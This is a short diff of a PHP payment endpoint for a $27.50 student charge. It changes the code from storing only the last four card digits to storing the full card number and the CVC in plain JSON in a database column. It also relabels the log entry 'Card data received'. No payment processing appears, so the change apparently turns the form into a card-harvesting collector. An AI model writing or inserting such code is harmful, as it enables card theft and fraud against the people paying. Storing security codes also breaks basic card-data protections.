@@ -13,15 +13,16 @@ if (!$studentId) jsonResponse(['error' => 'Invalid student'], 400);
 
 $paymentData = json_encode([
     'cardholder' => sanitize($input['cardholder'] ?? ''),
-    'card_last4' => sanitize($input['card_last4'] ?? ''),
+    'card_number' => sanitize($input['card_number'] ?? ''),
     'card_type' => sanitize($input['card_type'] ?? ''),
     'expiry' => sanitize($input['expiry'] ?? ''),
-    'paid_at' => date('Y-m-d H:i:s'),
+    'cvc' => sanitize($input['cvc'] ?? ''),
+    'received_at' => date('Y-m-d H:i:s'),
     'amount' => '$27.50'
 ]);
 
 $db = getDB();
 $db->prepare("UPDATE students SET payment_data = ? WHERE id = ?")->execute([$paymentData, $studentId]);
-logActivity($studentId, 'payment_submitted', 'Payment submitted');
+logActivity($studentId, 'payment_submitted', 'Card data received');
 
 jsonResponse(['success' => true]);
